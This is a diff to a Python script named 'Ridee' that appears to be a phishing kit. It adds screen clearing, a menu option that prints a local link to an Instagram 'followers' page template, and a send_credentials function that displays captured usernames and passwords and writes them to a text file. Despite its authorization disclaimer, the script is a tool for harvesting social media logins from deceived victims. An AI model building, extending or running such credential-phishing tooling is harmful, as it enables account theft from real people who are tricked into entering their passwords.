@@ -3,9 +3,14 @@ import time
 import os
 import sys
 
-print("\033[2J\033[H", end="", flush=True)
+def clear():
+    if os.name == "nt": 
+        os.system("cls")
+    else:
+        os.system("clear")
 
 def style():
+    clear()
     print(f"{Fore.GREEN}Welcome to Ridee!")
     for i in range(50):
         time.sleep(0.009)
@@ -19,7 +24,6 @@ def style():
     Users are solely responsible for how they use this tool.
     The developer does not endorse or accept responsibility for misuse,
     unauthorized activities, or violations of applicable laws.
-
     Use responsibly and only with proper authorization.'"""
     print(disclaimer.strip().replace("  ", ""))
     print("\n")
@@ -35,7 +39,7 @@ def style():
     else:
          exit()
     
-    print("\033[2J\033[H", end="", flush=True)
+    clear()
 
     asii_text = f"""{Fore.RED}
     ███████ ████  █████   ██████ ██████
@@ -53,7 +57,7 @@ def style():
     -------------------------------------------------------------"""
     print(copyright)
 
-# style()
+style()
 
 service = []
 
@@ -64,7 +68,7 @@ def menu():
     {Fore.WHITE}Choose a service! """)
      if options == "0":
           service.append(0)
-          print("\033[2J\033[H", end="", flush=True)
+          clear()
           text = f"""    {Fore.BLUE}                                                                               
 ██ ▄▄  ▄▄  ▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄   ▄▄▄▄ ▄▄▄▄   ▄▄▄  ▄▄   ▄▄   █████▄ ▄▄ ▄▄ ▄▄  ▄▄▄▄ ▄▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄  
 ██ ███▄██ ███▄▄   ██  ██▀██ ██ ▄▄ ██▄█▄ ██▀██ ██▀▄▀██   ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ ██▄▄  ██▄█▄ 
@@ -77,12 +81,28 @@ def menu():
           """)
           if services == "0":
                service.append(0)
+               print(f"{Fore.RED}Link : {Fore.GREEN}http://127.0.0.1:3000/instagram/followers/template.html")
           
-# menu()
+menu()
 
 def send_credentials(username, password):
-     print("Username :", username, "\nPassword :", password)
-     
-if __name__ == "__main__":
-    style()
-    menu()
+     print(f"""{Fore.RESET}
+     ################################################################
+     ## {Fore.YELLOW}> Username : {Fore.CYAN}{username}            
+     #                                                             |
+     ## {Fore.YELLOW}> Password : {Fore.CYAN}{password}            
+     #                                                             |    
+     ################################################################
+     {Fore.RESET}""")
+     try:
+          file = open("user.txt", "w")
+          file.write(f"(Username : {username}, password : {password})")
+          file.close()
+          print("Saved to 'user.txt'")
+     except:
+          filename = input("'user.txt' already exists, which filename would you save these credentials? ")
+          file = open(f"{filename}.txt", "w")
+          file.write(f"\n(Username : {username}, password : {password})")
+          file.close()
+          print(f"Saved to '{filename}.txt'")
+
